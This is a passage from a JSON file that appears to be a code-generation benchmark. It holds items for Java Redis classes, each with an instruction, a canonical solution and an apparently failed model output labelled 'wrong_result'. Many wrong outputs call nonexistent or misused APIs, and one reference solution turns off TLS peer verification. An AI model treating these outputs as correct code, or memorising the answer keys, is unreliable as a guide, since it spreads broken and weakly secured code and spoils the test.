    "FSMID_for_test": 37,
    "wrong_result": "public interface Subscriber {\n    void onMessage(String message);\n}\n\npublic class RedisPubSubManager {\n    private JedisPool jedisPool;\n    private String channelName;\n    private Logger logger;\n\n    public RedisPubSubManager(String host, int port, String channelName) {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(poolConfig, host, port);\n        this.channelName = channelName;\n    }\n\n    public void startSubscriber(Subscriber subscriber) {\n        new Thread(() -> {\n            try (Jedis jedis = jedisPool.getResource()) {\n                jedis.subscribe(new JedisPubSub() {\n                    @Override\n                    public void onMessage(String channel, String message) {\n                        subscriber.onMessage(message);\n                    }\n                }, channelName);\n            } catch (Exception e) {\n                logger.error(\"Error in subscriber\", e);\n            }\n        }).start();\n    }\n\n    public void startPublisher() {\n        // Placeholder for publisher logic\n    }\n\n    public void publish(String message) {\n        try (Jedis jedis = jedisPool.getResource()) {\n            jedis.publish(channelName, message);\n        } catch (Exception e) {\n            logger.error(\"Error publishing message\", e);\n        }\n    }\n\n    public void shutdown() {\n        if (jedisPool != null) {\n            jedisPool.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 335,
    "Instruction": "Task Description: Create a Redis configuration class in Java that sets up Redis connection and template configurations using Spring Boot and Redisson.\n\nClass Description: The RedisConfig class is a Spring configuration class that provides Redis-related beans including RedisTemplate, RedissonClient, and a custom KeyGenerator. It configures connection settings, serialization, and client instances for Redis operations.\n\nAttributes:\n- REDIS_PREFIX: [String] - A constant string prefix for Redis connection URLs (\"redis://\")\n\nMethods:\n- redisTemplate: [redisTemplate](LettuceConnectionFactory lettuceConnectionFactory) -> RedisTemplate<Object, Object> - Creates and configures a RedisTemplate with FastJson serialization and String key serialization\n- redisson: [redisson](RedisProperties redisProperties) -> RedissonClient - Creates and configures a Redisson client instance with single server configuration\n- keyGenerator: [keyGenerator]() -> KeyGenerator - Creates a custom key generator that produces SHA-256 hashes of method invocation details\n\nThe class uses Spring annotations (@Configuration, @Bean, etc.) to manage bean creation and dependencies, and integrates with Spring Boot's RedisProperties for configuration.",
    "Canonical_solution": "import com.alibaba.fastjson.JSON;\nimport org.apache.commons.codec.digest.DigestUtils;\nimport org.redisson.Redisson;\nimport org.redisson.api.RedissonClient;\nimport org.redisson.config.Config;\nimport org.redisson.config.SingleServerConfig;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnClass;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;\nimport org.springframework.boot.autoconfigure.data.redis.RedisProperties;\nimport org.springframework.boot.context.properties.EnableConfigurationProperties;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory;\nimport org.springframework.data.redis.core.RedisOperations;\nimport org.springframework.data.redis.core.RedisTemplate;\nimport org.springframework.data.redis.serializer.StringRedisSerializer;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\n@Configuration\n@ConditionalOnClass(RedisOperations.class)\n@EnableConfigurationProperties(RedisProperties.class)\npublic class RedisConfig {\n\n    private static final String REDIS_PREFIX = \"redis://\";\n\n    @Bean(name = \"redisTemplate\")\n    @ConditionalOnMissingBean(name = \"redisTemplate\")\n    public RedisTemplate<Object, Object> redisTemplate(LettuceConnectionFactory lettuceConnectionFactory) {\n        RedisTemplate<Object, Object> template = new RedisTemplate<>();\n        FastJsonRedisSerializer<Object> fastJsonRedisSerializer = new FastJsonRedisSerializer<>(Object.class);\n        template.setValueSerializer(fastJsonRedisSerializer);\n        template.setHashValueSerializer(fastJsonRedisSerializer);\n        template.setKeySerializer(new StringRedisSerializer());\n        template.setHashKeySerializer(new StringRedisSerializer());\n        template.setConnectionFactory(lettuceConnectionFactory);\n        return template;\n    }\n\n    @Bean(destroyMethod = \"shutdown\")\n    public RedissonClient redisson(RedisProperties redisProperties) {\n        Config config = new Config();\n        SingleServerConfig singleServerConfig = config.useSingleServer();\n        singleServerConfig.setAddress(REDIS_PREFIX + redisProperties.getHost() + \":\" + redisProperties.getPort());\n        if (redisProperties.getPassword() != null && !redisProperties.getPassword().isEmpty()) {\n            singleServerConfig.setPassword(redisProperties.getPassword());\n        }\n        singleServerConfig.setPingConnectionInterval(1000);\n        return Redisson.create(config);\n    }\n\n    @Bean\n    public KeyGenerator keyGenerator() {\n        return (target, method, params) -> {\n            Map<String, Object> container = new HashMap<>(3);\n            Class<?> targetClassClass = target.getClass();\n            container.put(\"class\", targetClassClass.toGenericString());\n            container.put(\"methodName\", method.getName());\n            container.put(\"package\", targetClassClass.getPackage());\n            for (int i = 0; i < params.length; i++) {\n                container.put(String.valueOf(i), params[i]);\n            }\n            String jsonString = JSON.toJSONString(container);\n            return DigestUtils.sha256Hex(jsonString);\n        };\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "import org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.data.redis.connection.RedisConnectionFactory;\nimport org.springframework.data.redis.core.RedisTemplate;\nimport org.springframework.data.redis.serializer.StringRedisSerializer;\nimport org.springframework.data.redis.serializer.FastJson2JsonRedisSerializer;\nimport io.redisson.Redisson;\nimport io.redisson.config.Config;\nimport io.redisson.client.codec.StringCodec;\nimport io.redisson.client.protocol.ClientMode;\nimport io.redisson.api.RedissonClient;\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Base64;\nimport java.lang.reflect.Method;\nimport org.springframework.data.redis.core.KeyGenerator;\nimport org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory;\nimport org.springframework.boot.autoconfigure.data.redis.RedisProperties;\n\n@Configuration\npublic class RedisConfig {\n    public static final String REDIS_PREFIX = \"redis://\";\n\n    @Bean\n    public RedisTemplate<Object, Object> redisTemplate(LettuceConnectionFactory lettuceConnectionFactory) {\n        RedisTemplate<Object, Object> template = new RedisTemplate<>();\n        template.setConnectionFactory(lettuceConnectionFactory);\n        template.setKeySerializer(new StringRedisSerializer());\n        template.setValueSerializer(new FastJson2JsonRedisSerializer(Object.class));\n        return template;\n    }\n\n    @Bean\n    public RedissonClient redisson(RedisProperties redisProperties) {\n        Config config = new Config();\n        config.useSingleServer()\n                .setAddress(REDIS_PREFIX + redisProperties.getHost() + \":\" + redisProperties.getPort())\n                .setPassword(redisProperties.getPassword())\n                .setDatabase(redisProperties.getDatabase());\n        return Redisson.create(config);\n    }\n\n    @Bean\n    public KeyGenerator keyGenerator() {\n        return new KeyGenerator() {\n            @Override\n            public String generateKey(String id, Object[] parameters, Method method) {\n                StringBuilder sb = new StringBuilder();\n                sb.append(method.getDeclaringClass().getName()).append(\":\").append(method.getName());\n                for (Object param : parameters) {\n                    sb.append(\":\").append(param.toString());\n                }\n                String keyStr = sb.toString();\n                try {\n                    MessageDigest digest = MessageDigest.getInstance(\"SHA-256\");\n                    byte[] hashBytes = digest.digest(keyStr.getBytes(StandardCharsets.UTF_8));\n                    return Base64.getEncoder().encodeToString(hashBytes);\n                } catch (NoSuchAlgorithmException e) {\n                    throw new RuntimeException(\"SHA-256 algorithm not found\", e);\n                }\n            }\n        };\n    }\n}"
  },
  {
    "Task_id": 336,
    "Instruction": "Task Description: Create a Java utility class for interacting with Redis using sharded connections, providing thread-safe initialization, connection pooling, and basic CRUD operations for both string and object values.\n\nClass Description: JedisUtil is a utility class that manages Redis connections using Jedis sharding with connection pooling. It provides methods for storing and retrieving both string and serialized object values with expiration support.\n\nAttributes:\n- logger: Logger - SLF4J logger for logging messages\n- address: String - Comma-separated Redis server addresses\n- shardedJedisPool: ShardedJedisPool - Pool of sharded Redis connections\n- INSTANCE_INIT_LOCL: ReentrantLock - Lock for thread-safe initialization\n\nMethods:\n- init(String address) -> void - Initializes the Redis connection pool with the given addresses\n- getInstance() -> ShardedJedis - Returns a sharded Redis connection instance (thread-safe initialization)\n- close() -> void - Closes the Redis connection pool and releases resources\n- serialize(Object object) -> byte[] - Serializes a Java object to byte array\n- unserialize(byte[] bytes) -> Object - Deserializes a byte array back to a Java object\n- setStringValue(String key, String value, int seconds) -> String - Stores a string value in Redis with expiration time\n- setObjectValue(String key, Object obj, int seconds) -> String - Stores a serialized object in Redis with expiration time\n- getStringValue(String key) -> String - Retrieves a string value from Redis\n- getObjectValue(String key) -> Object - Retrieves and deserializes an object from Redis",
    "Canonical_solution": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedis.JedisShardInfo;\nimport redis.clients.jedis.ShardedJedis;\nimport redis.clients.jedis.ShardedJedisPool;\n\nimport java.io.*;\nimport java.util.LinkedList;\nimport java.util.List;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class JedisUtil {\n    private static Logger logger = LoggerFactory.getLogger(JedisUtil.class);\n    private static String address;\n    private static ShardedJedisPool shardedJedisPool;\n    private static ReentrantLock INSTANCE_INIT_LOCL = new ReentrantLock(false);\n\n    public static void init(String address) {\n        JedisUtil.address = address;\n        getInstance();\n    }\n\n    private static ShardedJedis getInstance() {\n        if (shardedJedisPool == null) {\n            try {\n                if (INSTANCE_INIT_LOCL.tryLock(2, TimeUnit.SECONDS)) {\n                    try {\n                        if (shardedJedisPool == null) {\n                            JedisPoolConfig config = new JedisPoolConfig();\n                            config.setMaxTotal(200);\n                            config.setMaxIdle(50);\n                            config.setMinIdle(8);\n                            config.setMaxWaitMillis(10000);\n                            config.setTestOnBorrow(true);\n                            config.setTestOnReturn(false);\n                            config.setTestWhileIdle(true);\n                            config.setTimeBetweenEvictionRunsMillis(30000);\n                            config.setNumTestsPerEvictionRun(10);\n                            config.setMinEvictableIdleTimeMillis(60000);\n\n                            List<JedisShardInfo> jedisShardInfos = new LinkedList<JedisShardInfo>();\n                            String[] addressArr = address.split(\",\");\n                            for (int i = 0; i < addressArr.length; i++) {\n                                JedisShardInfo jedisShardInfo = new JedisShardInfo(addressArr[i]);\n                                jedisShardInfos.add(jedisShardInfo);\n                            }\n                            shardedJedisPool = new ShardedJedisPool(config, jedisShardInfos);\n                            logger.info(\">>>>>>>>>>> xxl-sso, JedisUtil.ShardedJedisPool init success.\");\n                        }\n                    } finally {\n                        INSTANCE_INIT_LOCL.unlock();\n                    }\n                }\n            } catch (InterruptedException e) {\n                logger.error(e.getMessage(), e);\n            }\n        }\n\n        if (shardedJedisPool == null) {\n            throw new NullPointerException(\">>>>>>>>>>> xxl-sso, JedisUtil.ShardedJedisPool is null.\");\n        }\n\n        return shardedJedisPool.getResource();\n    }\n\n    public static void close() throws IOException {\n        if(shardedJedisPool != null) {\n            shardedJedisPool.close();\n        }\n    }\n\n    private static byte[] serialize(Object object) {\n        ObjectOutputStream oos = null;\n        ByteArrayOutputStream baos = null;\n        try {\n            baos = new ByteArrayOutputStream();\n            oos = new ObjectOutputStream(baos);\n            oos.writeObject(object);\n            return baos.toByteArray();\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            try {\n                if (oos != null) oos.close();\n                if (baos != null) baos.close();\n            } catch (IOException e) {\n                logger.error(e.getMessage(), e);\n            }\n        }\n        return null;\n    }\n\n    private static Object unserialize(byte[] bytes) {\n        ByteArrayInputStream bais = null;\n        try {\n            bais = new ByteArrayInputStream(bytes);\n            ObjectInputStream ois = new ObjectInputStream(bais);\n            return ois.readObject();\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            try {\n                if (bais != null) bais.close();\n            } catch (IOException e) {\n                logger.error(e.getMessage(), e);\n            }\n        }\n        return null;\n    }\n\n    public static String setStringValue(String key, String value, int seconds) {\n        String result = null;\n        ShardedJedis client = getInstance();\n        try {\n            result = client.setex(key, seconds, value);\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            if (client != null) {\n                client.close();\n            }\n        }\n        return result;\n    }\n\n    public static String setObjectValue(String key, Object obj, int seconds) {\n        String result = null;\n        ShardedJedis client = getInstance();\n        try {\n            result = client.setex(key.getBytes(), seconds, serialize(obj));\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            if (client != null) {\n                client.close();\n            }\n        }\n        return result;\n    }\n\n    public static String getStringValue(String key) {\n        String value = null;\n        ShardedJedis client = getInstance();\n        try {\n            value = client.get(key);\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            if (client != null) {\n                client.close();\n            }\n        }\n        return value;\n    }\n\n    public static Object getObjectValue(String key) {\n        Object obj = null;\n        ShardedJedis client = getInstance();\n        try {\n            byte[] bytes = client.get(key.getBytes());\n            if (bytes != null && bytes.length > 0) {\n                obj = unserialize(bytes);\n            }\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            if (client != null) {\n                client.close();\n            }\n        }\n        return obj;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class JedisUtil {\n    private static final Logger logger = LoggerFactory.getLogger(JedisUtil.class);\n    private static String address;\n    private static ShardedJedisPool shardedJedisPool;\n    private static final ReentrantLock INSTANCE_INIT_LOCL = new ReentrantLock();\n\n    public static void init(String address) {\n        if (address == null || address.isEmpty()) {\n            throw new IllegalArgumentException(\"Address cannot be null or empty\");\n        }\n        String[] hosts = address.split(\",\");\n        List<HostAndPort> hostAndPorts = new ArrayList<>();\n        for (String host : hosts) {\n            String[] parts = host.trim().split(\":\");\n            int port = 6379;\n            if (parts.length > 1) {\n                port = Integer.parseInt(parts[1]);\n            }\n            hostAndPorts.add(new HostAndPort(parts[0], port));\n        }\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        poolConfig.setMaxTotal(100);\n        poolConfig.setMaxIdle(50);\n        poolConfig.setMinIdle(10);\n        poolConfig.setMaxWaitMillis(1000);\n        shardedJedisPool = new ShardedJedisPool(poolConfig, hostAndPorts);\n    }\n\n    public static ShardedJedis getInstance() {\n        INSTANCE_INIT_LOCL.lock();\n        try {\n            if (shardedJedisPool == null) {\n                if (address == null || address.isEmpty()) {\n                    throw new IllegalStateException(\"Address not set\");\n                }\n                init(address);\n            }\n            return shardedJedisPool.getResource();\n        } finally {\n            INSTANCE_INIT_LOCL.unlock();\n        }\n    }\n\n    public static void close() {\n        if (shardedJedisPool != null) {\n            shardedJedisPool.close();\n        }\n    }\n\n    public static byte[] serialize(Object object) throws IOException {\n        ByteArrayOutputStream bos = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(bos);\n        oos.writeObject(object);\n        oos.flush();\n        return bos.toByteArray();\n    }\n\n    public static Object unserialize(byte[] bytes) throws IOException, ClassNotFoundException {\n        ByteArrayInputStream bis = new ByteArrayInputStream(bytes);\n        ObjectInputStream ois = new ObjectInputStream(bis);\n        return ois.readObject();\n    }\n\n    public static String setStringValue(String key, String value, int seconds) {\n        ShardedJedis jedis = null;\n        try {\n            jedis = shardedJedisPool.getResource();\n            return jedis.setex(key, seconds, value);\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n\n    public static String setObjectValue(String key, Object obj, int seconds) {\n        ShardedJedis jedis = null;\n        try {\n            jedis = shardedJedisPool.getResource();\n            byte[] serialized = serialize(obj);\n            return jedis.setex(key, seconds, serialized);\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n\n    public static String getStringValue(String key) {\n        ShardedJedis jedis = null;\n        try {\n            jedis = shardedJedisPool.getResource();\n            return jedis.get(key);\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n\n    public static Object getObjectValue(String key) {\n        ShardedJedis jedis = null;\n        try {\n            jedis = shardedJedisPool.getResource();\n            byte[] bytes = jedis.get(key);\n            if (bytes == null) {\n                return null;\n            }\n            return unserialize(bytes);\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 337,
    "Instruction": "Task Description: Create a Java class that provides geospatial operations using Redis, including adding locations, querying locations within a radius, calculating distances between locations, and retrieving position coordinates.\n\nClass Description: The RedisGeoOperations class encapsulates Redis geospatial commands using the Lettuce client. It manages Redis connections and provides methods for common geospatial operations.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance for connection management\n- redisCommands: RedisCommands<String, String> - Synchronous Redis command interface for executing operations\n\nMethods:\n- RedisGeoOperations(String host, int port) -> void - Constructor that initializes the Redis client with specified host and port\n- addGeoLocation(String key, double longitude, double latitude, String member) -> void - Adds a geospatial member with coordinates to the specified key\n- getGeoRadius(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit) -> Set<String> - Returns members within given radius of a point\n- getGeoDistance(String key, String member1, String member2, GeoArgs.Unit unit) -> Double - Calculates distance between two members in specified units\n- getGeoRadiusWithArgs(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit, GeoArgs geoArgs) -> List<GeoWithin<String>> - Returns members within radius with additional options (like distance or coordinates)\n- getGeoPositions(String key, String... members) -> List<GeoCoordinates> - Returns coordinates for specified members\n- closeConnection() -> void - Properly closes Redis connection and shuts down client",
    "Canonical_solution": "import io.lettuce.core.*;\nimport io.lettuce.core.api.sync.RedisCommands;\n\npublic class RedisGeoOperations {\n\n    private RedisClient redisClient;\n    private RedisCommands<String, String> redisCommands;\n\n    public RedisGeoOperations(String host, int port) {\n        this.redisClient = RedisClient.create(RedisURI.Builder.redis(host, port).build());\n        this.redisCommands = redisClient.connect().sync();\n    }\n\n    public void addGeoLocation(String key, double longitude, double latitude, String member) {\n        redisCommands.geoadd(key, longitude, latitude, member);\n    }\n\n    public Set<String> getGeoRadius(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit) {\n        return redisCommands.georadius(key, longitude, latitude, radius, unit);\n    }\n\n    public Double getGeoDistance(String key, String member1, String member2, GeoArgs.Unit unit) {\n        return redisCommands.geodist(key, member1, member2, unit);\n    }\n\n    public List<GeoWithin<String>> getGeoRadiusWithArgs(String key, double longitude, double latitude, double radius, \n                                                      GeoArgs.Unit unit, GeoArgs geoArgs) {\n        return redisCommands.georadius(key, longitude, latitude, radius, unit, geoArgs);\n    }\n\n    public List<GeoCoordinates> getGeoPositions(String key, String... members) {\n        return redisCommands.geopos(key, members);\n    }\n\n    public void closeConnection() {\n        redisCommands.getStatefulConnection().close();\n        redisClient.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisGeoOperations {\n    private final RedisClient redisClient;\n    private final RedisCommands<String, String> redisCommands;\n\n    public RedisGeoOperations(String host, int port) {\n        this.redisClient = RedisClient.create(\"redis://@\" + host + \":\" + port);\n        this.redisCommands = redisClient.connect().sync();\n    }\n\n    public void addGeoLocation(String key, double longitude, double latitude, String member) {\n        redisCommands.geoAdd(key, longitude, latitude, member);\n    }\n\n    public Set<String> getGeoRadius(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit) {\n        List<GeoRadiusResult> results = redisCommands.geoRadius(key, longitude, latitude, radius, unit, GeoArgs.newGeoArgs());\n        Set<String> members = new HashSet<>();\n        for (GeoRadiusResult result : results) {\n            members.add(result.getName());\n        }\n        return members;\n    }\n\n    public Double getGeoDistance(String key, String member1, String member2, GeoArgs.Unit unit) {\n        return redisCommands.geoDist(key, member1, member2, unit);\n    }\n\n    public List<GeoWithin<String>> getGeoRadiusWithArgs(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit, GeoArgs geoArgs) {\n        return redisCommands.geoRadius(key, longitude, latitude, radius, unit, geoArgs);\n    }\n\n    public List<GeoCoordinates> getGeoPositions(String key, String... members) {\n        return redisCommands.geoPos(key, members);\n    }\n\n    public void closeConnection() {\n        redisClient.shutdown();\n    }\n}"
  },
  {
    "Task_id": 338,
    "Instruction": "Task Description: Create a Java class that establishes and manages connections to a Redis master-replica setup using Lettuce client, with support for read operations from replicas and secure connection handling.\n\nClass Description: RedisMasterReplicaConnector is a utility class that provides methods to create, manage, and close connections to a Redis master-replica cluster. It supports read scaling by allowing read operations from replicas and includes secure connection handling with custom DNS resolution.\n\nAttributes:\n- clientResources: ClientResources - The Lettuce client resources configuration including custom socket address resolver\n\nMethods:\n- RedisMasterReplicaConnector(ClientResources) -> void - Constructor that initializes client resources with custom DNS resolution\n- createConnection(String host, String masterId) -> StatefulRedisMasterReplicaConnection<String, String> - Creates a connection to Redis master-replica setup with specified host and master ID\n- closeConnection(StatefulRedisMasterReplicaConnection<String, String> connection) -> void - Properly closes the Redis connection and shuts down the client\n- performOperations(StatefulRedisMasterReplicaConnection<String, String> connection, String key, String value) -> void - Demonstrates basic Redis operations (set and get) using the established connection",
    "Canonical_solution": "import io.lettuce.core.ReadFrom;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.codec.StringCodec;\nimport io.lettuce.core.resource.ClientResources;\nimport io.lettuce.core.resource.DnsResolver;\nimport io.lettuce.core.resource.MappingSocketAddressResolver;\nimport io.lettuce.test.resource.FastShutdown;\n\npublic class RedisMasterReplicaConnector {\n\n    private final ClientResources clientResources;\n\n    public RedisMasterReplicaConnector(ClientResources clientResources) {\n        this.clientResources = clientResources.mutate()\n                .socketAddressResolver(MappingSocketAddressResolver.create(DnsResolver.jvmDefault(), hostAndPort -> {\n                    return HostAndPort.of(hostAndPort.getHostText(), hostAndPort.getPort() + 443);\n                })).build();\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> createConnection(String host, String masterId) {\n        RedisClient client = RedisClient.create(clientResources);\n        RedisURI redisURI = RedisURI.create(\"rediss-sentinel://\" + host + \":26379?sentinelMasterId=\" + masterId);\n        redisURI.setVerifyPeer(false);\n        \n        StatefulRedisMasterReplicaConnection<String, String> connection = \n            MasterReplica.connect(client, StringCodec.UTF8, redisURI);\n        connection.setReadFrom(ReadFrom.REPLICA);\n        \n        return connection;\n    }\n\n    public void closeConnection(StatefulRedisMasterReplicaConnection<String, String> connection) {\n        if (connection != null) {\n            connection.close();\n            FastShutdown.shutdown(connection.getRedisClient());\n        }\n    }\n\n    public void performOperations(StatefulRedisMasterReplicaConnection<String, String> connection, String key, String value) {\n        connection.sync().set(key, value);\n        connection.sync().get(key);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisMasterReplicaConnector {\n    private final ClientResources clientResources;\n\n    public RedisMasterReplicaConnector(ClientResources clientResources) {\n        this.clientResources = clientResources;\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> createConnection(String host, String masterId) {\n        RedisClient client = RedisClient.create(clientResources);\n        return client.connectMasterReplica();\n    }\n\n    public void closeConnection(StatefulRedisMasterReplicaConnection<String, String> connection) {\n        connection.close();\n    }\n\n    public void performOperations(StatefulRedisMasterReplicaConnection<String, String> connection, String key, String value) {\n        SyncCommands<String, String> sync = connection.sync();\n        sync.set(key, value);\n        String result = sync.get(key);\n        System.out.println(\"Get result: \" + result);\n    }\n}"
  },
  {
    "Task_id": 339,
    "Instruction": "Task Description: Implement a Redis client class in Java that supports read-write operations with master-slave architecture, connection pooling, and proper resource management.\n\nClass Description: ReadWriteRedisClient is a Java class that provides a Redis client implementation with support for master-slave architecture. It uses connection pooling (via JedisPool) for efficient resource management and implements basic CRUD operations with automatic routing of read operations to slaves and write operations to the master.\n\nAttributes:\n- master: JedisPool - Connection pool for the master Redis instance\n- slaves: List<JedisPool> - List of connection pools for slave Redis instances\n- jedisPoolConfig: JedisPoolConfig - Configuration for the connection pools\n- address: String - Comma-separated list of Redis server addresses (master first)\n- timeout: int - Connection timeout in milliseconds\n- random: Random - Random number generator for slave selection\n\nMethods:\n- initialize() -> void - Initializes the Redis connection pools based on the configured addresses\n- destroy() -> void - Closes all connection pools and releases resources\n- get(String key) -> String - Retrieves a value from Redis (reads from a random slave)\n- set(String key, String value) -> String - Stores a value in Redis (writes to master)\n- fetchResource(boolean read) -> Jedis - Internal method to get a Redis connection (selects master or random slave)\n- setJedisPoolConfig(JedisPoolConfig jedisPoolConfig) -> void - Sets the connection pool configuration\n- setTimeout(int timeout) -> void - Sets the connection timeout\n- setAddress(String address) -> void - Sets the Redis server addresses",
    "Canonical_solution": "import redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Random;\n\npublic class ReadWriteRedisClient {\n\n    private JedisPool master;\n    private List<JedisPool> slaves = new ArrayList<JedisPool>();\n    private JedisPoolConfig jedisPoolConfig;\n    private String address;\n    private int timeout = 3000;\n    private Random random = new Random();\n\n    public void initialize() throws Exception {\n        String[] hostAndPorts = address.split(\",\");\n        String masterHP = hostAndPorts[0];\n        String[] ms = masterHP.split(\":\");\n        master = new JedisPool(jedisPoolConfig, ms[0], Integer.valueOf(ms[1]), timeout);\n        if (hostAndPorts.length > 1) {\n            for (int i = 1; i < hostAndPorts.length; i++) {\n                String[] ss = hostAndPorts[i].split(\":\");\n                JedisPool slave = new JedisPool(jedisPoolConfig, ss[0], Integer.valueOf(ss[1]), timeout);\n                slaves.add(slave);\n            }\n        }\n        slaves.add(master);\n    }\n\n    public void destroy() throws Exception {\n        if (master != null) {\n            master.close();\n        }\n        for (JedisPool slave : slaves) {\n            if (slave != null) {\n                slave.close();\n            }\n        }\n    }\n\n    public String get(String key) {\n        Jedis jedis = fetchResource(true);\n        try {\n            return jedis.get(key);\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n\n    public String set(String key, String value) {\n        Jedis jedis = fetchResource(false);\n        try {\n            return jedis.set(key, value);\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n\n    private Jedis fetchResource(boolean read) {\n        if(slaves.isEmpty() || !read) {\n            return master.getResource();\n        }\n        int size = slaves.size();\n        int i = random.nextInt(size);\n        return slaves.get(i).getResource();\n    }\n\n    public void setJedisPoolConfig(JedisPoolConfig jedisPoolConfig) {\n        this.jedisPoolConfig = jedisPoolConfig;\n    }\n\n    public void setTimeout(int timeout) {\n        this.timeout = timeout;\n    }\n\n    public void setAddress(String address) {\n        this.address = address;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class ReadWriteRedisClient {\n    private JedisPool master;\n    private List<JedisPool> slaves;\n    private JedisPoolConfig jedisPoolConfig;\n    private String address;\n    private int timeout;\n    private Random random;\n\n    public void initialize() {\n        if (address == null || address.isEmpty()) {\n            throw new IllegalArgumentException(\"Address is required\");\n        }\n        String[] addressParts = address.split(\",\");\n        if (addressParts.length == 0) {\n            throw new IllegalArgumentException(\"Address cannot be empty\");\n        }\n        String masterAddress = addressParts[0];\n        List<String> slaveAddresses = new ArrayList<>(Arrays.asList(Arrays.copyOfRange(addressParts, 1, addressParts.length)));\n        String[] masterHostPort = masterAddress.split(\":\");\n        if (masterHostPort.length != 2) {\n            throw new IllegalArgumentException(\"Invalid master address format: \" + masterAddress);\n        }\n        String masterHost = masterHostPort[0];\n        int masterPort = Integer.parseInt(masterHostPort[1]);\n        master = new JedisPool(jedisPoolConfig, masterHost, masterPort, timeout);\n        slaves = new ArrayList<>();\n        for (String slaveAddress : slaveAddresses) {\n            String[] hostPort = slaveAddress.split(\":\");\n            if (hostPort.length != 2) {\n                throw new IllegalArgumentException(\"Invalid slave address format: \" + slaveAddress);\n            }\n            String host = hostPort[0];\n            int port = Integer.parseInt(hostPort[1]);\n            slaves.add(new JedisPool(jedisPoolConfig, host, port, timeout));\n        }\n    }\n\n    public void destroy() {\n        if (master != null) {\n            master.destroy();\n        }\n        if (slaves != null) {\n            for (JedisPool slavePool : slaves) {\n                slavePool.destroy();\n            }\n        }\n    }\n\n    public String get(String key) {\n        Jedis jedis = fetchResource(true);\n        try {\n            return jedis.get(key);\n        } finally {\n            jedis.close();\n        }\n    }\n\n    public String set(String key, String value) {\n        Jedis jedis = fetchResource(false);\n        try {\n            return jedis.set(key, value);\n        } finally {\n            jedis.close();\n        }\n    }\n\n    private Jedis fetchResource(boolean read) {\n        if (read) {\n            if (slaves.isEmpty()) {\n                throw new IllegalStateException(\"No slaves available for read operations\");\n            }\n            int index = random.nextInt(slaves.size());\n            JedisPool slavePool = slaves.get(index);\n            return slavePool.getResource();\n        } else {\n            if (master == null) {\n                throw new IllegalStateException(\"Master not initialized\");\n            }\n            return master.getResource();\n        }\n    }\n\n    public void setJedisPoolConfig(JedisPoolConfig jedisPoolConfig) {\n        this.jedisPoolConfig = jedisPoolConfig;\n    }\n\n    public void setTimeout(int timeout) {\n        this.timeout = timeout;\n    }\n\n    public void setAddress(String address) {\n        this.address = address;\n    }\n\n    public ReadWriteRedisClient() {\n        this.random = new Random();\n    }\n}"
  },
  {
    "Task_id": 34,
